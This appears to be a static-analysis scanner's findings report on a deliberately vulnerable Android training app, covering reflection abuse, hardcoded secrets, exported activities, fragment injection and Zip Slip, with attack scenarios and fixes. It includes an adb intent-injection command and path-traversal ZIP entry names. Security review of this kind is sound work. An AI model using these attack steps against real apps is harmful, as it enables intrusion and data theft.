result.attack_scenario: An attacker (via a malicious app or crafted deep link/ADB command if the Activity is exported, or via another injected intent) sends an explicit Intent to ReflectionActivity with the extra class_name set to a sensitive class, e.g. 'am start -n com.dlh.vulnerapp/.ReflectionActivity --es class_name com.some.library.DangerousClass'. The app loads and instantiates that class; its static initializer or constructor executes attacker-influenced logic inside the app's process and UID, potentially triggering file deletion, network calls, loading gadget classes as a stepping stone to further exploitation, or crashing the app (DoS). The attacker can also enumerate which classes exist on the classpath based on the Error/Loaded output displayed.
result.recommendation: Do not pass untrusted input to Class.forName(). If dynamic class loading is truly required, enforce a strict allowlist of permitted fully-qualified class names (e.g., validate className against a fixed Set<String> before use) and restrict to expected types via Class.asSubclass(). Prefer explicit factory maps (Map<String, Supplier<?>>) over reflection. Additionally, ensure the Activity is not exported in the manifest (android:exported="false") unless required, and validate all Intent extras.
result.false_positive_analysis: Impact is constrained because only the public/declared no-argument constructor is invoked with no arguments, so direct arbitrary method invocation with attacker-controlled parameters is not possible; exploitation relies on side effects in constructors/static initializers. The snippet does not show the manifest, so it is unknown whether the Activity is exported; if it is not exported and no other component forwards attacker input to it, reachability would be reduced. A default value (java.util.Date) is used only when the extra is absent, which does not mitigate the case where the attacker supplies the extra. No allowlist or validation is present in the snippet, so the vulnerability stands.

masvs_reference.description: The app validates and sanitizes all untrusted inputs. Avoid using reflection with untrusted input to prevent code execution.

result.evidence: private final String AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"; private final String AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"; private final String API_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.Et9HF98yRYq";
result.description: Three hardcoded secrets are embedded as string constants directly in the DEX byte code: an AWS access key (AKIA... pattern), an AWS secret key, and a JWT-format API token (eyJ... pattern). Anyone who decompiles the APK can trivially recover them, violating MASVS-STORAGE-2. The risk is compounded by additional leakage channels in the same snippet: the API token is written to logcat via Log.d("SecretsActivity", "Initialized with API Token: " + this.API_TOKEN), the AWS access key is persisted to plaintext SharedPreferences (putString("aws_key", ...)), and the AWS secret key is displayed on-screen via a Toast, exposing it to shoulder-surfing and screen capture.
result.attack_scenario: Attacker downloads the APK and decompiles it with jadx/apktool, then greps for the 'AKIA' and 'eyJ' patterns to extract the AWS access key, AWS secret key, and JWT API token. The attacker then uses the AWS credentials to access the developer's cloud resources (S3 buckets, EC2, IAM enumeration) and replays the API token against the backend to impersonate legitimate app traffic. Additionally, on a rooted device or via ADB/logcat, the attacker recovers the token from logs and the AWS key from /data/data/com.dlh.vulnerapp/shared_prefs/UserPrefs.xml.
result.recommendation: Remove all secrets from the client source code. Proxy cloud/API calls through a trusted backend that holds the credentials and issues short-lived, scoped tokens to the app. If a key must ship with the app, inject it at build time via BuildConfig/local.properties or the NDK and restrict it (e.g., API key restrictions), and store any runtime secrets in the Android Keystore or EncryptedSharedPreferences. Never log secrets (remove the Log.d of API_TOKEN), never persist them in plaintext SharedPreferences, and never display them in UI elements like Toasts. Rotate the exposed AWS keys and JWT immediately if they are or were ever valid.
result.false_positive_analysis: The AWS values are the canonical AWS documentation example credentials ('AKIAIOSFODNN7EXAMPLE' / 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY' contain 'EXAMPLE'), and the JWT decodes to an empty payload ({}) with a short dummy-looking signature, suggesting these are demo values in an intentionally vulnerable training app ('VulnerApp', 'SecretsActivity'). If these strings are never valid credentials in production, there is no real-world impact. However, the vulnerability pattern (hardcoded secrets extractable by decompilation, plus secret leakage via logs, SharedPreferences, and Toast) is unambiguous and present in the code, so the finding is reported as a true positive per MASVS-STORAGE-2; only the exploitability of these specific values is in question.

masvs_reference.description: The app prevents leakage of sensitive data. Ensure that no sensitive data, such as API keys or passwords, is hardcoded in the source code.

also_detected_by.description: Authentication bypass via control flow: the 'login' decision is made entirely client-side and the only 'verification' performed is that the username and password fields are non-empty. Any arbitrary input is accepted as a successful authentication, after which the app stores the AWS access key into SharedPreferences and displays the AWS secret key in a Toast. There is no comparison against a server response, stored credential hash, or any real authenticator — the security decision (authenticated vs. not) is trivially satisfied by the client, violating MASVS-AUTH principles that authentication must be performed and enforced server-side.

result.description: The app stores the user's plaintext password and a hardcoded AWS access key into SharedPreferences ("UserPrefs") without any encryption. Although mode 0 (MODE_PRIVATE) confines the file to the app sandbox, the shared_prefs XML contains cleartext credentials that can be extracted on rooted devices, via device backups, or through other vulnerabilities. Additionally, a hardcoded AWS secret key and API token are embedded in the class, and the API token is written to logcat via Log.d. This directly violates MASVS-STORAGE-1, which requires sensitive data to be stored using EncryptedSharedPreferences or protected with keys from the Android Keystore.
result.attack_scenario: An attacker with root access (or who tricks the user into enabling backup, or exploits another app vulnerability) pulls /data/data/com.dlh.vulnerapp/shared_prefs/UserPrefs.xml and reads the cleartext 'username', 'password', and 'aws_key' entries. They can then reuse the stolen password for credential-stuffing attacks against other services and use the AWS key to access cloud resources. The hardcoded API token and AWS secret can additionally be recovered by simply decompiling the APK or reading logcat output.
result.recommendation: Never store user passwords locally; authenticate against a backend and store only short-lived session tokens. If sensitive values must be persisted, use EncryptedSharedPreferences (Jetpack Security) backed by an AES-256 master key in the Android Keystore. Remove all hardcoded credentials (AWS keys, API tokens) from the client; provision them from a server or retrieve them at runtime from the Keystore. Remove the Log.d statement that prints the API token, and set android:allowBackup="false" if backups are not required.
result.false_positive_analysis: The AWS keys shown are the canonical AWS documentation example keys (AKIAIOSFODNN7EXAMPLE), suggesting they may be dummy placeholders rather than live credentials, and the app appears to be an intentionally vulnerable training app (package 'com.dlh.vulnerapp'). However, the pattern itself—writing a real user-entered password in plaintext to SharedPreferences—is a genuine vulnerability regardless of whether the AWS keys are live, and MODE_PRIVATE only protects against non-rooted sandbox access, which does not satisfy MASVS-STORAGE-1. No external encryption or validation is present in the snippet.

result.evidence: public final class UnprotectedExportedActivity extends AppCompatActivity { ... String data = getIntent().getStringExtra("secret_override"); ... if (data != null) { statusText.setText("Sensitive Action Triggered by External App!\nData: " + data); } else { statusText.setText("Unprotected Activity Launched.\nWaiting for malicious intent..."); }
result.description: Classic IPC/Intent trust flaw (MASVS-PLATFORM: insecure inter-process communication). The activity blindly consumes the 'secret_override' extra from any incoming Intent and treats its presence as authorization to perform what the code itself labels a 'Sensitive Action Triggered by External App'. There is no caller-identity verification (no getCallingActivity() check, no PackageManager signature comparison, no custom permission enforcement) before acting on external input. The class name 'UnprotectedExportedActivity' and the UI strings ('Unprotected Activity Launched', 'Waiting for malicious intent...') confirm the component is exported and intentionally trusts arbitrary external callers, meaning any installed app can drive this code path.
result.attack_scenario: An attacker installs (or already has) any malicious app on the device. That app builds an explicit Intent targeting com.dlh.vulnerapp.UnprotectedExportedActivity, attaches putExtra("secret_override", attackerControlledString), and calls startActivity(). Because the activity is exported with no permission gate, the system delivers the intent, onCreate() runs, sees data != null, and executes the 'sensitive action' branch under the attacker's control. The attacker can trigger the privileged flow at will, spoof the UI with crafted text for phishing/social-engineering, and chain this entry point into deeper functionality the activity exposes — all without any user interaction or granted permission.
result.recommendation: 1) In AndroidManifest.xml set android:exported="false" for this activity unless it genuinely must be reachable by other apps. 2) If external invocation is required, declare a custom signature-level permission (android:protectionLevel="signature") and require it on the component, or explicitly verify the caller via getCallingActivity().getPackageName() plus PackageManager.checkSignatures() against an allowlist before acting. 3) Never treat the mere presence of an Intent extra as authorization — re-validate security decisions server-side or against trusted local state, and sanitize/validate any extra content before use or display.
result.false_positive_analysis: The AndroidManifest.xml is not included in the snippet, so the exported status is inferred rather than directly observed — if the activity were actually exported="false" or protected by a signature permission, external apps could not reach it and the flaw would not be exploitable. However, the class name 'UnprotectedExportedActivity' and the literal strings 'Unprotected Activity Launched' / 'Waiting for malicious intent...' / 'Sensitive Action Triggered by External App!' are strong in-snippet evidence that it is exported without protection (this is a deliberately vulnerable training app). Additionally, the concrete 'sensitive action' shown here only updates a TextView, so the demonstrated impact in this snippet alone is low; the vulnerability rating reflects the trust-model flaw and its role as an attack-surface entry point rather than the currently visible benign action.

result.description: The activity extends the legacy android.preference.PreferenceActivity and overrides isValidFragment(String) to unconditionally return true. This defeats the framework's fragment-injection protection introduced in Android 4.4 (API 19), which requires PreferenceActivity subclasses to whitelist loadable fragments. Any caller that can launch this activity can force it to instantiate and display an arbitrary Fragment class present in the app (or its classpath) via the ':android:show_fragment' intent extra, together with attacker-controlled fragment arguments via ':android:show_fragment_args'. This violates MASVS-PLATFORM-1 (secure IPC) because an exported entry point accepts and acts upon untrusted input without validation, enabling fragment injection that can lead to unauthorized UI display, phishing/UI-redress, access to privileged fragment functionality, and, depending on the fragments available in the app, data exposure or further exploitation chains.
result.attack_scenario: A malicious app installed on the same device (assuming the activity is exported, which must be assumed risky without manifest evidence) creates an explicit Intent targeting com.dlh.vulnerapp.FragmentInjectionActivity and adds the extra ":android:show_fragment" with the fully-qualified name of an arbitrary fragment class bundled in the app, plus ":android:show_fragment_args" containing a crafted Bundle. Because isValidFragment() returns true for any name, PreferenceActivity happily instantiates the attacker-chosen fragment. The attacker can load hidden/internal settings or admin fragments to reach privileged actions, display a fake login fragment for credential phishing, or supply hostile arguments to fragments that perform reflection, file access, deep-link handling, or WebView loading, potentially escalating to data theft or code execution depending on the target fragment's behavior.
result.recommendation: 1) Replace the blanket 'return true' with strict allowlist validation, e.g. return MySettingsFragment.class.getName().equals(fragmentName); for every fragment the activity legitimately supports. 2) Prefer migrating away from the deprecated android.preference.PreferenceActivity to androidx PreferenceFragmentCompat hosted in a non-exported AppCompatActivity. 3) In the AndroidManifest, set android:exported="false" for this activity unless cross-app invocation is strictly required; if export is required, enforce a signature-level permission. 4) Never pass attacker-controlled ':android:show_fragment_args' data to sensitive operations without sanitization.
result.false_positive_analysis: The AndroidManifest was not provided, so the exported status is unknown; if the activity is declared with android:exported="false" and no intent filters, only in-process code could invoke it, reducing practical exploitability to low. Additionally, exploitation impact depends on which fragments exist in the app and whether any perform sensitive actions with fragment arguments; if only benign fragments exist, the impact is limited to UI redress/phishing. The package name (com.dlh.vulnerapp) and class name (FragmentInjectionActivity) suggest this may be an intentionally vulnerable training application, but the vulnerable code pattern itself is confirmed directly in the snippet, so the finding on the code is high-confidence regardless of manifest context.

also_detected_by.description: Classic fragment injection trust flaw. PreferenceActivity resolves which Fragment class to instantiate from Intent extras (e.g., ':android:show_fragment' / ':android:show_fragment_args'). The ONLY security gate deciding whether the requested class is allowed is isValidFragment(), and here it unconditionally returns true for any fragmentName. This is a client-side trust of a security decision: the control-flow check that exists specifically to validate attacker-influenced Intent data is hard-coded to always succeed, so any Fragment class on the app's classpath can be instantiated and displayed with attacker-controlled arguments, with no caller identity, signature, or allowlist verification (violates MASVS-PLATFORM intent/IPC trust and MASVS-AUTH control-flow integrity principles).

result.description: Classic Zip Slip path traversal (CWE-22). The unzip() method extracts ZipEntry names directly into new File(targetDir, entry.getName()) and writes them via FileOutputStream without any sanitization of '..' sequences or absolute paths, and without a getCanonicalPath() containment check against targetDir. Additionally, the ZIP file path itself is sourced from a tainted Intent extra ("zip_path"), so an attacker who can invoke this Activity can supply an arbitrary malicious archive. ZIP entry names are attacker-controlled, so crafted entries can escape the cache/unzipped directory and overwrite arbitrary files writable by the app's UID (shared_prefs, databases, other app-private files). This violates MASVS-CODE-4 (untrusted input used in file operations without validation/canonicalization).
result.attack_scenario: Attacker crafts a malicious ZIP containing entries named like '../../../../../data/data/com.dlh.vulnerapp/shared_prefs/auth.xml' or '../../lib/...'. The attacker places the ZIP in a readable location (e.g., shared external storage) and launches the Activity with an Intent extra zip_path pointing at it. unzip() resolves new File(targetDir, entry.getName()) outside the intended base directory, calls mkdirs() on the traversal path, and writes the entry contents with FileOutputStream, overwriting arbitrary app-private files. This can corrupt or hijack app state, overwrite configuration/session files, or plant payloads for later execution.
result.recommendation: Validate every entry before writing: resolve canonical paths and enforce containment, e.g. File outFile = new File(targetDir, entry.getName()); String dirPath = targetDir.getCanonicalPath(); String outPath = outFile.getCanonicalPath(); if (!outPath.startsWith(dirPath + File.separator)) { throw new SecurityException("Blocked Zip Slip entry: " + entry.getName()); }. Also reject absolute entry names and names containing '..'. Do not accept the ZIP location from an Intent extra without validation; restrict extraction to app-owned files, verify the Activity is not exported (or require a permission/signature check), and consider limiting entry size/count to prevent zip bombs.
result.false_positive_analysis: Exploitability depends on factors outside the snippet: if ZipSlipActivity is not exported in the manifest and no other component passes a zip_path extra, the only archive processed is the self-created demo.zip with a constant benign entry ('readme.txt'), making the traversal unreachable in practice. However, the code explicitly reads zip_path from an Intent extra, which strongly suggests an externally reachable entry point (the app is a deliberate vulnerability demo), and the missing canonical-path guard is an unconditional code-level flaw regardless of the current caller. Thus the vulnerability in the code is certain; only the attack surface (export status) is unverified from this snippet alone.

result.description: The unzip() method iterates over a ZipInputStream and constructs the output File directly from ZipEntry.getName() without any canonical path validation. There is no getCanonicalPath() check to ensure the resolved destination remains inside targetDir. A zip entry containing path traversal sequences (e.g., '../../shared_prefs/config.xml') would escape the cache/unzipped directory and allow arbitrary file write within the app's sandbox. This violates MASVS-CODE-4 (untrusted input from zip archives is not validated/sanitized before use in file operations). The risk is amplified because the zip path is taken from an intent extra (getIntent().getStringExtra("zip_path")), meaning another app or component could potentially supply a malicious zip file path if the activity is reachable.
result.attack_scenario: An attacker crafts a malicious ZIP archive containing an entry named '../../../../data/data/com.dlh.vulnerapp/shared_prefs/session.xml' (or targeting any writable location). The attacker passes this zip to the app via the 'zip_path' intent extra. When unzip() runs, new File(targetDir, entry.getName()) resolves outside the target directory, parent directories are created with mkdirs(), and the FileOutputStream overwrites the target file with attacker-controlled content, achieving arbitrary file write that can corrupt app data, overwrite configuration, or tamper with files later loaded by the app.
result.recommendation: Validate every entry path before extraction: resolve 'File outFile = new File(targetDir, entry.getName()).getCanonicalFile()' and verify 'outFile.getPath().startsWith(targetDir.getCanonicalFile().getPath() + File.separator)', throwing a SecurityException on mismatch. Additionally reject entry names containing '..' or absolute paths, verify the source of the 'zip_path' intent extra (e.g., only accept files from app-controlled directories), and limit extraction size/entry count to mitigate zip bombs.
result.false_positive_analysis: If the activity is not exported and 'zip_path' can only ever originate from fully trusted internal sources, and createDemoZip() (which writes only 'readme.txt') is the only reachable path, practical exploitability would be reduced. However, the snippet explicitly accepts an external zip path via an intent extra and contains no canonical path check, so the vulnerable code pattern is unambiguously present; the residual uncertainty only concerns the attack surface (activity export status), which is outside the provided snippet.
